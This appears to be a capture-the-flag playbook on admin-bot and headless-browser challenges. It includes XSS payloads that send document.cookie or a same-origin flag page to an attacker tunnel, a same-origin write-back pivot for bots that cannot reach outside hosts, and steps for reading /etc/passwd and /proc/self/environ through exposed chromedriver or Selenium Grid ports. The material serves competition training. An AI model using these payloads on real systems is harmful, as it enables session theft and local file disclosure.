# Real-world cases deep — the patterns, analysed

## Case: the report-form bot with a flag cookie

**Shape**: a stored field (comment, note, profile) the admin bot
renders; the bot carries a flag cookie on the app's domain.

**The solve path**:
1. `bot.js` supplied -> spec: `goto(userContent)`, `flag` cookie, 5s wait, `[--no-sandbox --disable-gpu]`
2. local driver + those flags -> set a `TESTFLAG` cookie -> goto the field's page
3. payload `fetch(tunnel?c=document.cookie)` -> confirmed in the reproduction
4. `goto own tunnel` -> channel live
5. store the payload -> the real bot renders it -> listener gets the flag

**The lesson**: the reproduction spec is the whole game — copy the
cookie's `domain`/`path`/`httpOnly` exactly, or the local test is on
a different bot.

## Case: the exposed chromedriver on a high port

**Shape**: a `9515`/`4444`/`9222` port answering `POST /session` or
`GET /json` — a debugging endpoint left open.

**The solve path**:
1. `POST :9515/session` -> `sessionId`
2. `file:///etc/passwd` + `source` -> `root:x:0:0` (the canary)
3. `file:///flag` -> `source` -> the flag
   or `file:///proc/self/environ` -> `FLAG=...` -> the path

**The lesson**: the endpoint is a capability — the `file://` read is
the exploit. Try `/proc/self/environ` when `/flag` guesses miss.

## Case: the bot that reads a flag page

**Shape**: the bot visits a page that renders the flag — your payload
reads the bot's context or the page for it.

**The solve path**:
1. reproduce -> the bot's authed page renders the flag
2. payload `fetch('/flag').then(r=>r.text()).then(t=>fetch(tunnel?f=btoa(t)))` -> read+exfil
   or the bot's `source`/`screenshot` carries it directly
3. confirmed locally -> fire once -> listener/artifact gets the flag

**The lesson**: the flag may be on a page the *bot's origin* reaches —
the payload's same-origin `fetch` reads it where a direct request
cannot.

## Case: the egress-blocked bot

**Shape**: the bot's browser cannot reach your listener — an egress
filter, a CSP, a tunnel interstitial.

**The solve path**:
1. `goto own tunnel` -> interstitial/refused (channel dead)
2. pivot: `fetch('/api/profile',{method:'POST',body:{bio:document.cookie}})` — write the flag to a same-origin store
3. the bot's write lands -> you fetch the store -> the flag

**The lesson**: the flag does not need to leave — the app's origin is
the channel. The write-back is the reliable egress-blocked pivot.

## Case: the Grid node

**Shape**: a `:4444` Grid — sessions route to nodes by capability.

**The solve path**:
1. `GET /status` -> node inventory (which browsers/versions/platforms)
2. `POST /session` with a matching stereotype -> a node session
3. `file://`/`localhost` reads — on the *node's* filesystem/network

**The lesson**: the reads land on the node, not necessarily the app —
`localhost`/`file://` are the node's position, which may differ.

## The case-to-shape map

| Case | Attack shape |
|---|---|
| report-form + cookie | reproduction + exfil (shape 1, 8) |
| exposed driver port | file read (shape 2) |
| flag-page bot | origin read (shape 7) |
| egress-blocked | write-back (shape 6) |
| Grid | node session (shape 2 on a node) |
